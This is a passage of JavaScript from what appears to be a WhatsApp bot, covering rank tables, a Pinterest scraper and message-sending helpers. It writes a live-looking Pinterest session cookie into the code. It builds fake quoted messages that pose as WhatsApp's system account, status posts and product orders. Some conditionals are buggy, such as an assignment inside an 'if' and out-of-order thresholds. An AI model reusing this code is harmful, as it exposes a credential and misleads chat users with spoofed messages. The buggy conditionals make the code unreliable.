const isMuted = isGroup ? mute.includes(from) : false

//=================================================//
const numbernye = `0@s.whatsapp.net`
const senderNumber = sender.split("@")[0]
const player = `${sender.split("@")[0]}@s.whatsapp.net`
const lucBulan = ['Bulan','Tahun','Hari','Minggu','Jam','Detik','Menit','Abad']
const lucBulan1 = lucBulan[Math.floor(Math.random() * (lucBulan.length))]
const ZeksApiku = zeksApi[Math.floor(Math.random() * (zeksApi.length))]
const date1 = Math.ceil(Math.random() * 100)
const luchit = hit_today.length
const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = client.user.phone


myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
myDays = ['Minggu','Senin','Selasa','Rabu','Kamis',"Jum'at",'Sabtu'];

const pinterest = (queryy) => {
  return new Promise((resolve, reject) => {
    axios.get(`https://id.pinterest.com/search/pins/?autologin=true&q=${queryy}`, {
      headers: {
        cookie: "_auth=1; _b=\"AVna7S1p7l1C5I9u0+nR3YzijpvXOPc6d09SyCzO+DcwpersQH36SmGiYfymBKhZcGg=\"; _pinterest_sess=TWc9PSZHamJOZ0JobUFiSEpSN3Z4a2NsMk9wZ3gxL1NSc2k2NkFLaUw5bVY5cXR5alZHR0gxY2h2MVZDZlNQalNpUUJFRVR5L3NlYy9JZkthekp3bHo5bXFuaFZzVHJFMnkrR3lTbm56U3YvQXBBTW96VUgzVUhuK1Z4VURGKzczUi9hNHdDeTJ5Y2pBTmxhc2owZ2hkSGlDemtUSnYvVXh5dDNkaDN3TjZCTk8ycTdHRHVsOFg2b2NQWCtpOWxqeDNjNkk3cS85MkhhSklSb0hwTnZvZVFyZmJEUllwbG9UVnpCYVNTRzZxOXNJcmduOVc4aURtM3NtRFo3STlmWjJvSjlWTU5ITzg0VUg1NGhOTEZzME9SNFNhVWJRWjRJK3pGMFA4Q3UvcHBnWHdaYXZpa2FUNkx6Z3RNQjEzTFJEOHZoaHRvazc1c1UrYlRuUmdKcDg3ZEY4cjNtZlBLRTRBZjNYK0lPTXZJTzQ5dU8ybDdVS015bWJKT0tjTWYyRlBzclpiamdsNmtpeUZnRjlwVGJXUmdOMXdTUkFHRWloVjBMR0JlTE5YcmhxVHdoNzFHbDZ0YmFHZ1VLQXU1QnpkM1FqUTNMTnhYb3VKeDVGbnhNSkdkNXFSMXQybjRGL3pyZXRLR0ZTc0xHZ0JvbTJCNnAzQzE0cW1WTndIK0trY05HV1gxS09NRktadnFCSDR2YzBoWmRiUGZiWXFQNjcwWmZhaDZQRm1UbzNxc21pV1p5WDlabm1UWGQzanc1SGlrZXB1bDVDWXQvUis3elN2SVFDbm1DSVE5Z0d4YW1sa2hsSkZJb1h0MTFpck5BdDR0d0lZOW1Pa2RDVzNySWpXWmUwOUFhQmFSVUpaOFQ3WlhOQldNMkExeDIvMjZHeXdnNjdMYWdiQUhUSEFBUlhUVTdBMThRRmh1ekJMYWZ2YTJkNlg0cmFCdnU2WEpwcXlPOVZYcGNhNkZDd051S3lGZmo0eHV0ZE42NW8xRm5aRWpoQnNKNnNlSGFad1MzOHNkdWtER0xQTFN5Z3lmRERsZnZWWE5CZEJneVRlMDd2VmNPMjloK0g5eCswZUVJTS9CRkFweHc5RUh6K1JocGN6clc1JmZtL3JhRE1sc0NMTFlpMVErRGtPcllvTGdldz0=; _ir=0"
      }
    }).then(({data}) => {
      const $ = cheerio.load(data)
      const result = []
      const hasil = []
      $('div > a').get().map(b => {
        const link = $(b).find('img').attr('src')
        result.push(link)
      })
      result.forEach(function (v) {
        if (v == undefined) return
        hasil.push(v.replace(/236/g,'736'))
      })
      hasil.shift()
      resolve(hasil)
    }).catch(reject)
  })
}

const reqXp  = 10 * (Math.pow(2, getLevelingLevel(sender)) - 1)
const uangku = checkATMuser(sender)
const potionpoint = checkPotionuser(sender)
var potionpointa = `💉:${potionpoint}`
if (potionpoint <= 9999){
}
const megapotionpoint = checkMegaPotionuser(sender)
var megapotionpointa = `💊:${megapotionpoint}`
if (megapotionpoint <= 9999){
}

var angka = '1'
if (isPremium) {
angka = '0'
} 
if (isOwner) {
angka = '0'
}
var prema = 'GRATISAN'
if (isRegistered) {
prema = 'GRATISAN'
} 
if (isGroupAdmins) {
prema = 'Admin Grup'
} 
if (isPremium) {
prema = 'Premium'
} 
if (isOwner) {
prema = 'Owner'
}

const levelRole = getLevelingLevel(sender)
var role = 'Newbie ㋡'
if (levelRole <= 0) {
role = 'Newbie ㋡'
} else if (levelRole <= 4) {
role = 'Beginner 1 ⚊¹'
} else if (levelRole <= 6) {
role = 'Beginner 2 ⚊²'
} else if (levelRole <= 8) {
role = 'Beginner 3 ⚊³'
} else if (levelRole <= 10) {
role = 'Beginner 4 ⚊⁴'
} else if (levelRole <= 12) {
role = 'Private 1 ⚌¹'
} else if (levelRole <= 14) {
role = 'Private 2 ⚌²'
} else if (levelRole <= 16) {
role = 'Private 3 ⚌³'
} else if (levelRole <= 18) {
role = 'Private 4 ⚌⁴'
} else if (levelRole <= 20) {
role = 'Private 5 ⚌⁵'
} else if (levelRole <= 22) {
role = 'Corporal 1 ☰¹'
} else if (levelRole <= 24) {
role = 'Corporal 2 ☰²'
} else if (levelRole <= 26) {
role = 'Corporal 3 ☰³'
} else if (levelRole <= 28) {
role = 'Corporal 4 ☰⁴'
} else if (levelRole <= 30) {
role = 'Corporal 5 ☰⁵'
} else if (levelRole <= 32) {
role = 'Sergeant 1 ≣¹'
} else if (levelRole <= 34) {
role = 'Sergeant 2 ≣²'
} else if (levelRole <= 36) {
role = 'Sergeant 3 ≣³'
} else if (levelRole <= 38) {
role = 'Sergeant 4 ≣⁴'
} else if (levelRole <= 40) {
role = 'Sergeant 5 ≣⁵'
} else if (levelRole <= 42) {
role = 'Staff 1 ﹀¹'
} else if (levelRole <= 44) {
role = 'Staff 2 ﹀²'
} else if (levelRole <= 46) {
role = 'Staff 3 ﹀³'
} else if (levelRole <= 48) {
role = 'Staff 4 ﹀⁴'
} else if (levelRole <= 50) {
role = 'Staff 5 ﹀⁵'
} else if (levelRole <= 52) {
role = 'Sergeant 1 ︾¹'
} else if (levelRole <= 54) {
role = 'Sergeant 2 ︾²'
} else if (levelRole <= 56) {
role = 'Sergeant 3 ︾³'
} else if (levelRole <= 58) {
role = 'Sergeant 4 ︾⁴'
} else if (levelRole <= 60) {
role = 'Sergeant 5 ︾⁵'
} else if (levelRole <= 62) {
role = '2nd Lt. 1 ♢¹ '
} else if (levelRole <= 64) {
role = '2nd Lt. 2 ♢²'
} else if (levelRole <= 66) {
role = '2nd Lt. 3 ♢³'
} else if (levelRole <= 68) {
role = '2nd Lt. 4 ♢⁴'
} else if (levelRole <= 70) {
role = '2nd Lt. 5 ♢⁵'
} else if (levelRole <= 72) {
role = '1st Lt. 1 ♢♢¹'
} else if (levelRole <= 74) {
role = '1st Lt. 2 ♢♢²'
} else if (levelRole <= 76) {
role = '1st Lt. 3 ♢♢³'
} else if (levelRole <= 78) {
role = '1st Lt. 4 ♢♢⁴'
} else if (levelRole <= 80) {
role = '1st Lt. 5 ♢♢⁵'
} else if (levelRole <= 82) {
role = 'Major 1 ✷¹'
} else if (levelRole <= 84) {
role = 'Major 2 ✷²'
} else if (levelRole <= 86) {
role = 'Major 3 ✷³'
} else if (levelRole <= 88) {
role = 'Major 4 ✷⁴'
} else if (levelRole <= 90) {
role = 'Major 5 ✷⁵'
} else if (levelRole <= 92) {
role = 'Colonel 1 ✷✷¹'
} else if (levelRole <= 94) {
role = 'Colonel 2 ✷✷²'
} else if (levelRole <= 96) {
role = 'Colonel 3 ✷✷³'
} else if (levelRole <= 98) {
role = 'Colonel 4 ✷✷⁴'
} else if (levelRole <= 100) {
role = 'Colonel 5 ✷✷⁵'
} else if (levelRole <= 102) {
role = 'Brigadier Early ✰'
} else if (levelRole <= 104) {
role = 'Brigadier Silver ✩'
} else if (levelRole <= 106) {
role = 'Brigadier gold ✯'
} else if (levelRole <= 108) {
role = 'Brigadier Platinum ✬'
} else if (levelRole <= 110) {
role = 'Brigadier Diamond ✪'
} else if (levelRole <= 112) {
role = 'Major General Early ✰'
} else if (levelRole <= 114) {
role = 'Major General Silver ✩'
} else if (levelRole <= 116) {
role = 'Major General gold ✯'
} else if (levelRole <= 118) {
role = 'Major General Platinum ✬'
} else if (levelRole <= 120) {
role = 'Major General Diamond ✪'
} else if (levelRole <= 122) {
role = 'Lt.General Early ✰'
} else if (levelRole <= 124) {
role = 'Lt.General Silver ✩'
} else if (levelRole <= 126) {
role = 'Lt.General gold ✯'
} else if (levelRole <= 128) {
role = 'Lt.General Platinum ✬'
} else if (levelRole <= 130) {
role = 'Lt. General Diamond ✪'
} else if (levelRole <= 132) {
role = 'General Early ✰'
} else if (levelRole <= 134) {
role = 'General Silver ✩'
} else if (levelRole <= 136) {
role = 'General gold ✯'
} else if (levelRole <= 138) {
role = 'General Platinum ✬'
} else if (levelRole <= 140) {
role = 'General Diamond ✪'
} else if (levelRole <= 142) {
role = 'Commander Early ★'
} else if (levelRole <= 144) {
role = 'Commander Intermediate ⍣'
} else if (levelRole <= 146) {
role = 'Commander Elite ≛'
} else if (levelRole <= 148) {
role = 'The Commander Hero ⍟'
} else if (levelRole <= 152) {
role = 'Legends 忍'
} else if (levelRole <= 154) {
role = 'Legends 忍'
} else if (levelRole <= 156) {
role = 'Legends 忍'
} else if (levelRole <= 158) {
role = 'Legends 忍'
} else if (levelRole <= 160) {
role = 'Legends 忍'
} else if (levelRole <= 162) {
role = 'Legends 忍'
} else if (levelRole <= 164) {
role = 'Legends 忍'
} else if (levelRole <= 166) {
role = 'Legends 忍'
} else if (levelRole <= 168) {
role = 'Legends 忍'
} else if (levelRole <= 170) {
role = 'Legends 忍'
} else if (levelRole <= 172) {
role = 'Legends 忍'
} else if (levelRole <= 174) {
role = 'Legends 忍'
} else if (levelRole <= 176) {
role = 'Legends 忍'
} else if (levelRole <= 178) {
role = 'Legends 忍'
} else if (levelRole <= 180) {
role = 'Legends 忍'
} else if (levelRole <= 182) {
role = 'Legends 忍'
} else if (levelRole <= 184) {
role = 'Legends 忍'
} else if (levelRole <= 186) {
role = 'Legends 忍'
} else if (levelRole <= 188) {
role = 'Legends 忍'
} else if (levelRole <= 190) {
role = 'Legends 忍'
} else if (levelRole <= 192) {
role = 'Legends 忍'
} else if (levelRole <= 194) {
role = 'Legends 忍'
} else if (levelRole <= 196) {
role = 'Legends 忍'
} else if (levelRole <= 198) {
role = 'Legends 忍'
} else if (levelRole <= 200) {
role = 'Legends 忍'
} else if (levelRole <= 210) {
role = 'Legends 忍'
} else if (levelRole <= 220) {
role = 'Legends 忍'
} else if (levelRole <= 230) {
role = 'Legends 忍'
} else if (levelRole <= 240) {
role = 'Legends 忍'
} else if (levelRole <= 250) {
role = 'Legends 忍'
} else if (levelRole <= 260) {
role = 'Legends 忍'
} else if (levelRole <= 270) {
role = 'Legends 忍'
} else if (levelRole <= 280) {
role = 'Legends 忍'
} else if (levelRole <= 290) {
role = 'Legends 忍'
} else if (levelRole <= 300) {
role = 'Legends 忍'
} else if (levelRole <= 310) {
role = 'Legends 忍'
} else if (levelRole <= 320) {
role = 'Legends 忍'
} else if (levelRole <= 330) {
role = 'Legends 忍'
} else if (levelRole <= 340) {
role = 'Legends 忍'
} else if (levelRole <= 350) {
role = 'Legends 忍'
} else if (levelRole <= 360) {
role = 'Legends 忍'
} else if (levelRole <= 370) {
role = 'Legends 忍'
} else if (levelRole <= 380) {
role = 'Legends 忍'
} else if (levelRole <= 390) {
role = 'Legends 忍'
} else if (levelRole <= 400) {
role = 'Legends 忍'
} else if (levelRole <= 410) {
role = 'Legends 忍'
} else if (levelRole <= 420) {
role = 'Legends 忍'
} else if (levelRole <= 430) {
role = 'Legends 忍'
} else if (levelRole <= 440) {
role = 'Legends 忍'
} else if (levelRole <= 450) {
role = 'Legends 忍'
} else if (levelRole <= 460) {
role = 'Legends 忍'
} else if (levelRole <= 470) {
role = 'Legends 忍'
} else if (levelRole <= 480) {
role = 'Legends 忍'
} else if (levelRole <= 490) {
role = 'Legends 忍'
} else if (levelRole <= 500) {
role = 'Legends 忍'
} else if (levelRole <= 600) {
role = 'Legends 忍'
} else if (levelRole <= 700) {
role = 'Legends 忍'
} else if (levelRole <= 800) {
role = 'Legends 忍'
} else if (levelRole <= 900) {
role = 'Legends 忍'
} else if (levelRole <= 1000) {
role = 'Mythic I 上帝'
} else if (levelRole <= 2000) {
role = 'Mythic II 上帝'
} else if (levelRole <= 3000) {
role = 'Mythic III 上帝'
} else if (levelRole <= 4000) {
role = 'Mythic IV 上帝'
} else if (levelRole <= 5000) {
role = 'Mythic V 上帝'
} else if (levelRole <= 6000) {
role = 'Mythic VII 上帝'
} else if (levelRole <= 7000) {
role = 'Mythic VIII 上帝'
} else if (levelRole <= 8000) {
role = 'Mythic IX 上帝'
} else if (levelRole <= 9000) {
role = 'Mythic X 上帝'
} else if (levelRole <= 10000) {
role = 'Awakened Mythic 特尔邦贡'
} else if (levelRole <= 99999999999) {
role = 'End level 程度❗'
}

const hearts = checkHealuser(sender)
var heartbars = `💛💛💛💛💛💛💛💛💛💛`
if (hearts <= 0) {
heartbars = `🖤🖤🖤🖤🖤🖤🖤🖤🖤🖤`
} else if (hearts <= 5) {
heartbars = `💔🖤🖤🖤🖤🖤🖤🖤🖤🖤`
} else if (hearts <= 10) {
heartbars = `❤️🖤🖤🖤🖤🖤🖤🖤🖤🖤`
} else if (hearts <= 15) {
heartbars = `❤️💔🖤🖤🖤🖤🖤🖤🖤🖤`
} else if (hearts <= 20) {
heartbars = `❤️❤️🖤🖤🖤🖤🖤🖤🖤🖤`
} else if (hearts <= 25) {
heartbars = `❤️❤️💔🖤🖤🖤🖤🖤🖤🖤`
} else if (hearts <= 30) {
heartbars = `❤️❤️❤️🖤🖤🖤🖤🖤🖤🖤`
} else if (hearts <= 35) {
heartbars = `❤️❤️❤️💔🖤🖤🖤🖤🖤🖤`
} else if (hearts <= 40) {
heartbars = `❤️❤️❤️❤️🖤🖤🖤🖤🖤🖤`
} else if (hearts <= 45) {
heartbars = `❤️❤️❤️❤️💔🖤🖤🖤🖤🖤`
} else if (hearts <= 50) {
heartbars = `❤️❤️❤️❤️❤️🖤🖤🖤🖤🖤`
} else if (hearts <= 55) {
heartbars = `❤️❤️❤️❤️❤️💔🖤🖤🖤🖤`
} else if (hearts <= 60) {
heartbars = `❤️❤️❤️❤️❤️❤️🖤🖤🖤🖤`
} else if (hearts <= 65) {
heartbars = `❤️❤️❤️❤️❤️❤️💔🖤🖤🖤}`
} else if (hearts <= 70) {
heartbars = `❤️❤️❤️❤️❤️❤️❤️🖤🖤🖤`
} else if (hearts <= 75) {
heartbars = `❤️❤️❤️❤️❤️❤️❤️💔🖤🖤`
} else if (hearts <= 80) {
heartbars = `❤️❤️❤️❤️❤️❤️❤️❤️🖤🖤`
} else if (hearts <= 85) {
heartbars = `❤️❤️❤️❤️❤️❤️❤️❤️💔🖤`
} else if (hearts <= 90) {
heartbars = `❤️❤️❤️❤️❤️❤️❤️❤️❤️🖤`
} else if (hearts <= 95) {
heartbars = `❤️❤️❤️❤️❤️❤️❤️❤️❤️💔`
} else if (hearts <= 200) {
heartbars = `❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️`
} else if (hearts <= 150) {
heartbars = `♥️♥️♥️♥️♥️♥️♥️♥️♥️♥️`
} else if (hearts <= 300) {
heartbars = `💖💖💖💖💖💖💖💖💖💖`
} else if (hearts <= 400) {
heartbars = `💗💗💗💗💗💗💗💗💗💗`
} else if (hearts <= 1000) {
heartbars = `💝💝💝💝💝💝💝💝💝💝`
} else if (hearts <= 2000) {
heartbars = `💓💓💓💓💓💓💓💓💓💓`
} else if (hearts <= 3000) {
heartbars = `💘💘💘💘💘💘💘💘💘💘`
} else if (hearts <= 9999) 


client.setStatus(`|User:${_registered.length}|Server Name:${client.browserDescription[0]}|Server:${client.browserDescription[1]}|`).catch((_)=>_);
settingstatus = new Date() * 1;

//=================================================//	

const isUrl = (url) => {return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))}

const replyex = (teks) => { client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{sendEphemeral: true}})}

const replysticker = (stiker) => { client.sendMessage(from, stiker, sticker, {quoted:mek, contextInfo:{sendEphemeral: true, "externalAdReply":{"title": `${hahh}`,"body": `Runtime ${kyun(process.uptime())}`,"previewType": "PHOTO","thumbnailUrl": ` `,"thumbnail": WMthumb,"sourceUrl": `${mybio}`}}})}

const reply = (teks) => {
client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{sendEphemeral: true, "externalAdReply":{"title": `${hahh}`,"body": `Runtime ${kyun(process.uptime())}`,"previewType": "PHOTO","thumbnailUrl": ` `,"thumbnail": WMthumb,"sourceUrl": `${mybio}`}}})}

const sendListMes = (buttons) => {
client.sendMessage(from, buttons, MessageType.listMessage, {quoted: ftoko, thumbnail:WMthumb, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}})
}

const mentions = (teks, memberr, id) => {(id == null || id == undefined || id == false) ? client.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr} }) : client.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
}

const fakethumb = (teks, yes) => {client.sendMessage(from, teks, image, {thumbnail:WMthumb,quoted:mek,caption:yes})}

const fakeitem = (teks) => {
client.sendMessage(from, teks, text, {
quoted: {
key:{
fromMe:false,
participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289530298948-1604595598@g.us" }: {})
},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":WMthumb,"itemCount":`${date1}`,"status":"INQUIRY","surface":"CATALOG","message":fake,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}

const ftoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { "remoteJid": "6289530298948-1604595598@g.us" } : {})
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": WMthumb 
},
"title": 'Whatsapp Bot', 
"description": fake, 
"currencyCode": "IDR",
"priceAmount1000": "50000000",
"retailerId": "6289530298948@s.whatsapp.net",
"productImageCount": `${date1}`
},
"businessOwnerJid": `0@s.whatsapp.net`
}}}

const fakegroup = (teks) => {
            client.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289530298948-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": WMthumb,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true
            })
        }
		
		const fstatus = {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail":  WMthumb,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
	}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}

//FAKE REPLY
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289530298948-1604595598@g.us"  }, "message": {orderMessage: {itemCount: `${date1}`,status: 200, thumbnail: WMthumb, surface: 200, message: fake, orderTitle: 'L', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const fdoc = {key :  {participant : '0@s.whatsapp.net'},message: {documentMessage:{title: fake,jpegThumbnail: WMthumb}}}
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289530298948-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":99999,"ptt": "true"}} } 
const fgif  = {key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289530298948-1613049930@g.us" } : {})},message: {"videoMessage": { "title":fake, "h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': "*BROADCAST*", 'jpegThumbnail': WMthumb}}}
const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": fake, 'jpegThumbnail': WMthumb}}}
const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289530298948-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":fake, "h": `Hmm`,'seconds': '99999', 'caption': fake, 'jpegThumbnail': WMthumb}}}
const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: fake,jpegThumbnail: WMthumb}}}
const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${ownername}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': WMthumb, thumbnail: WMthumb,sendEphemeral: true}}}
var fakeReplyList = ['ftroli', 'fdoc', 'fvn', 'fgif', 'fgclink', 'fvideo', 'floc', 'fkontak']
var fakeReply = fakeReplyList[Math.floor(Math.random() * fakeReplyList.length)];


const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        client.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
const sendFileFromUrl = async(link, type, options) => {
hasil = await getBuffer(link)
client.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
client.sendMessage(from, hasil, type, options).catch(e => {
client.sendMessage(from, { url : link }, type, options).catch(e => {
reply
console.log(e)
})
})
})
})
}
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    client.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}, thumbnail: Buffer.alloc(0)})
                    
                    fs.unlinkSync(filename)
                });
            } 
       async function sendFileFromUrl1(from, url, caption, mek, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return client.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: mek, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
        const textImg = (teks) => {
            return client.sendMessage(from, teks, text, {quoted: mek, wmthumbnail: fs.readFileSync(`image/${wmthumbnail}`)})
        }
let contrii = []
for (let i of ow) {
contrii.push({"displayName": `OWner ${fake}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:${fake}\nFN:WhatsApp\nitem1.TEL;waid=0:0\nitem1.X-ABLabel:Kang Banned\nitem2.X-ABLabel:THANK WhatsApp\nEND:VCARD`
},
{
"displayName": `Developer ${fake}`,
"vcard": vcardowner
},
{
"displayName": `OWner ${fake}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:${fake}\nFN:${ownername2}\nitem1.TEL;waid=${owner2}:${owner2}\nitem1.X-ABLabel:Creator Bot \nitem2.EMAIL;type=INTERNET:${mygmail}\nitem2.X-ABLabel:Email\nitem4.URL:${mybio}\nitem4.X-ABLabel:Youtube\nitem5.ADR:;;🇮🇩 Indonesia;;;;\nitem5.X-ABLabel:Region\nitem6.X-ABLabel:THANK SIEGRIN\nEND:VCARD`
},
{
"displayName": `OWner ${fake}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:${fake}\nFN:${ownername3}\nitem1.TEL;waid=${owner2}:${owner2}\nitem1.X-ABLabel:Creator Bot \nitem2.EMAIL;type=INTERNET:${mygmail}\nitem2.X-ABLabel:Email\nitem4.URL:${mybio}\nitem4.X-ABLabel:Youtube\nitem5.ADR:;;🇮🇩 Indonesia;;;;\nitem5.X-ABLabel:Region\nitem6.X-ABLabel:THANK SIEGRIN\nEND:VCARD`
},
{
"displayName": `OWner ${fake}`,
"vcard": vcard
})
}
let contri1 = []
for (let i of ow) {
contri1.push({
"displayName": `Developer ${fake}`,
"vcard": vcard
},
{
"displayName": `Developer ${fake}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nFN:Dellas\nORG: Dev Bot\nTEL;type=CELL;type=VOICE;waid=6281224863098:6281224863098\nEND:VCARD`
},
{
"displayName": `Developer Bot`,
"vcard": vcard
})
}

const support = `*Support ${supportme}*\n*Offical Bot By @${numbernye.split("@")[0]}*\n*Powered By @${ow.split("@")[0]}*`
const daftar3 = [{buttonId: `daftar`,buttonText: {displayText: `VERIFIKASI`,},type: 1,},]


try {
daftarmema = await client.getProfilePicture(`${daftaren.split('@')[0]}@s.whatsapp.net`)
} catch {
daftarmema = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
 buffer = await getBuffer(daftarmema)
daftarmemaaa = await client.prepareMessage(from, buffer, MessageType.location, {thumbnail: buffer})
let daftarmemaaaaa = daftarmemaaa.message["ephemeralMessage"] ? daftarmemaaa.message.ephemeralMessage : daftarmemaaa

const sendButtonNotRegis = (id) => {
if(autoregis = true){ 
addRegisteredUser(sender)
setTimeout( () => {
const daftaren = `${sender.split("@")[0]}@s.whatsapp.net`
{
const buttons = [
  {buttonId: 'simplemenu', buttonText: {displayText: 'MENU'}, type: 1},
  {buttonId: 'inventory', buttonText: {displayText: 'INVENTORY'}, type: 1},
]

const buttonsMessage = {
    contentText: `*❲ VERIFIKASI SUKSES ❳*\n_ketik ${prefix}menu jika tombolnya muncul_`,
    footerText: support,
    buttons: buttons,
    headerType: 6, 
	locationMessage: daftarmemaaaaa.message.locationMessage
}
client.sendMessage(from, buttonsMessage, MessageType.buttonsMessage, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [player, numbernye, dev, ow]}})
}
}, 5000)
replysticker(waitstc)
if (autobackup === true) {
setTimeout( () => {
